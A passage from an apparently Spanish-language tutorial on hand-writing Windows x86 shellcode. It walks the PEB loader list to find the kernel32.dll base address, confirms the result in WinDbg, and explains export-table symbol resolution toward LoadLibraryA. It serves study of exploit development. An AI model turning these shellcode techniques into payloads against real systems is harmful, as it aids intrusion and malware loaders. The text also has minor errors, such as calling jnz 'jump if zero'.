&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, fs:[ecx+30h];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; PEB       
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, [esi+0Ch];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; PEB -&amp;gt; Ldr    
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, [esi+1Ch];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Ldr -&amp;gt; InInitializationOrderModuleList
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Con &lt;code&gt;xor ecx, ecx&lt;&#x2F;code&gt;, se establece el registro a 0, el cuál se va a usar como desplazamiento, despues se mueve el PEB a esi y almacena el puntero ahí, una vez que esi tiene el puntero del PEB, lo desreferenciamos con el desplazamiento &lt;code&gt;0x0c&lt;&#x2F;code&gt; que es el de Ldr, el puntero de Ldr está almacenado en ESI, por lo que se hace de nuevo otra desreferencia para almacenar el desplazamiento &lt;code&gt;0x1c&lt;&#x2F;code&gt; para obtener la entrada de &lt;code&gt;InInitializationOrderModuleList&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Implementamos otra función, &lt;code&gt;next_module&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;next_module:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov ebx, [esi+8h];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;     &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt;   base_name
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov edi, [esi+20h];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt;   module_name
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov esi, [esi];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;        &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt;   Siguiente (flink) 
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;cmp [edi+12*2], cx;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;    &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt;   (unicode) module_name[12] == 0x00? 
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;jne next_module;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;       &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt;   No? -&amp;gt; siguiente modulo  
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;ret&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Esta función es la encargada de transferir la dirección base a EBX y la dirección del nombre a EDI, la tercera instrucción asigna a esi la siguient entrada de &lt;code&gt;InInitializationOrderModuleList&lt;&#x2F;code&gt; mediante el uso de &lt;code&gt;flink&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Finalmente se compara &lt;code&gt;edi + 24&lt;&#x2F;code&gt; con &lt;code&gt;cx&lt;&#x2F;code&gt; que establecimos en null(0), esto lo que quiere decir esque si encuentra una cadena de 24 caracteres con terminador nulo parará.&lt;&#x2F;p&gt;
&lt;p&gt;La razón por la cual se busca esto es por &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt;, que tiene una longitud de 12 bytes. Pero dado que la cadena se almacena en formato unicode, cada carácter se representará como una palabra en lugar de un byte, lo que dará una longitud de 24 caracteres en unicode.&lt;&#x2F;p&gt;
&lt;p&gt;Es decir, si encontramos una cadena unicode de 25 caracteres, habremos encontrado una cadena de 12 caracteres.&lt;&#x2F;p&gt;
&lt;p&gt;Si la comparación falla saltará al siguiente modulo y se verificará de nuevo la siguiente entrada hasta que la comparación tenga éxito.&lt;&#x2F;p&gt;
&lt;p&gt;Debido a que &lt;code&gt;InInitializationOrderModuleList&lt;&#x2F;code&gt; muestra los módulos según el orden en que se inicializaron, el primer nombre de módulo que coincida con la comparación siempre será kernel32.dll, ya que es uno de los primeros en inicializarse.&lt;&#x2F;p&gt;
&lt;p&gt;Para confirmar que nuestro shellcode funciona correctamente, adjuntémoslo a WinDBG:&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; u @eip l10
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c0000 cc              int     3
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c0001 89e5            mov     ebp,esp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c0003 83ec60          sub     esp,60h
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c0006 31c9            xor     ecx,ecx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c0008 648b7130        mov     esi,dword ptr fs:[ecx+30h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c000c 8b760c          mov     esi,dword ptr [esi+0Ch]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c000f 8b761c          mov     esi,dword ptr [esi+1Ch]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c0012 8b5e08          mov     ebx,dword ptr [esi+8]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c0015 8b7e20          mov     edi,dword ptr [esi+20h]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c0018 8b36            mov     esi,dword ptr [esi]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c001a 66394f18        cmp     word ptr [edi+18h],cx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c001e 75f2            jne     013c0012
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013c0020 c3              ret
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Pondremos un breakpoint en la primera entrada de &lt;code&gt;InInitializationOrderModuleList&lt;&#x2F;code&gt;, que sería la dirección de memoria &lt;code&gt;013c001a&lt;&#x2F;code&gt;, donde se realiza la comparación.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; r @ebx
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ebx=77010000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; du @edi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77019314  &amp;quot;ntdll.dll&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; lm m ntdll
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Browse full module list
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start    end        module name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;77010000 771af000   ntdll      (pdb symbols)          C:\ProgramData\Dbg\sym\ntdll.pdb\EBAE1381C11394FF20DD5EFC34E32FD91\ntdll.pdb
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El snippet anterior, muestra la dirección base de &lt;code&gt;ntdll.dll&lt;&#x2F;code&gt;, podemos confirmar que es la primera entrada.&lt;&#x2F;p&gt;
&lt;p&gt;Además hemos comprobado que la resolución de dirección base obtenida de &lt;code&gt;_LDR_DATA_TABLE_ENTRY_&lt;&#x2F;code&gt; es correcta.&lt;&#x2F;p&gt;
&lt;p&gt;Como este módulo no es el que estamos buscando, se realizará un salto condicional &lt;code&gt;jnz&lt;&#x2F;code&gt; (jump if zero) hasta que se encuentre la dirección base de &lt;strong&gt;Kernel32&lt;&#x2F;strong&gt;. Elimanos el punto de interrupción puesto anteriormente, y dejemos que la ejecución continúe.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;(1670.27ac): Access violation - code c0000005 (first chance)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;First chance exceptions are reported before any exception handling.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;This exception may be expected and handled.
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=0317fd90 ebx=76f70000 ecx=00000000 edx=013c0000 esi=013d5ce8 edi=013d2328
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=00000000 esp=0317fcdc ebp=0317fd38 iopl=0         nv up ei pl zr na pe nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;00000000 ??              ???
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; r @ebx 
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ebx=76f70000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; du @edi
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013d2328  &amp;quot;KERNEL32.DLL&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Recordemos que &lt;code&gt;edi&lt;&#x2F;code&gt;, almacenaba el nombre de la dirección resuelta, tras esto vemos que hemos obtenido de forma correcta la dirección base de &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt; analizando la lista dobleblemente enlazada &lt;code&gt;InInitializationOrderModuleList&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;resolucion-de-simbolos&quot;&gt;Resolución de símbolos&lt;a class=&quot;zola-anchor&quot; href=&quot;#resolucion-de-simbolos&quot; aria-label=&quot;Anchor link for: resolucion-de-simbolos&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;Una vez que hemos obtenido la dirección de Kernel32, el siguiente paso es resolver las APIs que exporta.&lt;&#x2F;p&gt;
&lt;p&gt;Anteriormente, mencionamos que&lt;code&gt;GetProcAddress&lt;&#x2F;code&gt;, nos da la capacidad de poder localizar funciones exportadas, pero también debe localizarse antes de poder usar.&lt;&#x2F;p&gt;
&lt;p&gt;En lugar de usar esta API, buscaremos en la tabla de direcciones de exportación (EAT) en busca de una equivalente.&lt;&#x2F;p&gt;
&lt;p&gt;La EAT es una estructura en una DLL que expone funciones que esa DLL ofrece a otros módulos.&lt;&#x2F;p&gt;
&lt;p&gt;Por ejemplo &lt;code&gt;LoadLibrary&lt;&#x2F;code&gt; está exportada por &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt; o &lt;code&gt;ntdll.dll&lt;&#x2F;code&gt; y viven en su EAT.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;exportar-tabla-de-directorios&quot;&gt;Exportar tabla de directorios&lt;a class=&quot;zola-anchor&quot; href=&quot;#exportar-tabla-de-directorios&quot; aria-label=&quot;Anchor link for: exportar-tabla-de-directorios&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;La forma más confiable de resolver símbolos de &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt; y otras DLL, es utilizando el método EAT.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;Símbolos, se refiere a los nombres de la funciones y sus direcciones de memoria iniciables.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Generalmente, las DLL que exportan funciones tiene una EAT que contiene información sobre los símbolos:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Número de símbolos exportados&lt;&#x2F;li&gt;
&lt;li&gt;Dirección virtual relativa (RVA) del arreglo de funciones exportadas.&lt;&#x2F;li&gt;
&lt;li&gt;RVA del arreglo de nombres exportados.&lt;&#x2F;li&gt;
&lt;li&gt;RVA del arreglo ordinales exportados.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c z-code&quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c&quot;&gt;struct&lt;&#x2F;span&gt; _IMAGE_EXPORT_DIRECTORY &lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; Characteristics&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; TimeDateStamp&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt; MajorVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;WORD&lt;&#x2F;span&gt; MinorVersion&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; Name&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; Base&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; NumberOfFunctions&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; NumberOfNames&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; AddressOfFunctions&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; AddressOfNames&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;DWORD&lt;&#x2F;span&gt; AddressOfNameOrdinals&lt;span class=&quot;z-punctuation z-terminator z-c&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c&quot;&gt;&lt;span class=&quot;z-meta z-block z-c&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Se debe tener en cuenta las matrices &lt;code&gt;AddressOfFunctions&lt;&#x2F;code&gt;, &lt;code&gt;AddressOfNames&lt;&#x2F;code&gt; y &lt;code&gt;AddressOfNameOrdinals.&lt;&#x2F;code&gt;, ya que son esenciales para la resolución de símbolos.&lt;&#x2F;p&gt;
&lt;p&gt;Comenzemos con &lt;code&gt;AddressOfNames&lt;&#x2F;code&gt;, cada nombre tendrá una entrada e índice único en el array.&lt;&#x2F;p&gt;
&lt;p&gt;Una vez que hemos encontrado el nombre del símbolo que buscamos en el índice i del array &lt;code&gt;AddressOfNames&lt;&#x2F;code&gt;, podemos usar el mismo índice i en el array &lt;code&gt;AddressOfNameOrdinals&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;La entrada del array &lt;code&gt;AddressOfNameOrdinals&lt;&#x2F;code&gt; en el índice i contendrá un valor que servirá como nuevo índice que usaremos en el array &lt;code&gt;AddressOfFunctions&lt;&#x2F;code&gt; . En este nuevo índice, encontraremos la dirección de memoria virtual relativa de la función.&lt;&#x2F;p&gt;
&lt;p&gt;Podemos convetir esta dirección en una Dirección de Memoria virtual (VMA) completamente funcional añadiéndole la dirección base de la DLL.&lt;&#x2F;p&gt;
&lt;p&gt;Para hacer este proceso, implementaremos una función hash de 4 bytes, que nos permitirá reutilizar las instrucciones de ensamblador para cualquier nombre de símbolo.&lt;&#x2F;p&gt;
&lt;p&gt;Una vez se resvuelva  el símbolo &lt;code&gt;LoadLibraryA&lt;&#x2F;code&gt; podremos cargar módulos arbitrarios sin necesidad de usar &lt;code&gt;GetProcAddress&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;La EDT, es la tabla principal que describe dónde están las otras tablas como la EAT.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;trabajando-con-la-matriz-de-nombres-de-exportacion&quot;&gt;Trabajando con la matriz de nombres de exportación&lt;a class=&quot;zola-anchor&quot; href=&quot;#trabajando-con-la-matriz-de-nombres-de-exportacion&quot; aria-label=&quot;Anchor link for: trabajando-con-la-matriz-de-nombres-de-exportacion&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Ahora que hemos cubierto la relación de las tres matrices en la tabla de directorios de exportacion (EDT) actualizemos nuestro script.&lt;&#x2F;p&gt;
&lt;p&gt;Para poder obtener la dirección de memoria virtual, nuestro shellcode suele añadir la dirección base de kernel32.dll al RVA, que recordemos que se almacena en EBX.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;RVA - Relative Virtual Address: Si &lt;code&gt;kernel32.dll&lt;&#x2F;code&gt; está cargado en &lt;code&gt;0x75000000&lt;&#x2F;code&gt; y una función tiene RVA &lt;code&gt;0x1234&lt;&#x2F;code&gt;, su VMA es &lt;code&gt;0x75001234&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;VMA - Virtual Memory Addres: Es la dirección real donde está el código o dato en memoria durante la ejecución.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-qualified-name z-python&quot;&gt;&lt;span class=&quot;z-variable z-other z-constant z-python&quot;&gt;CODE&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-assignment z-python&quot;&gt;=&lt;&#x2F;span&gt; &lt;span class=&quot;z-meta z-group z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-python&quot;&gt;(&lt;&#x2F;span&gt;
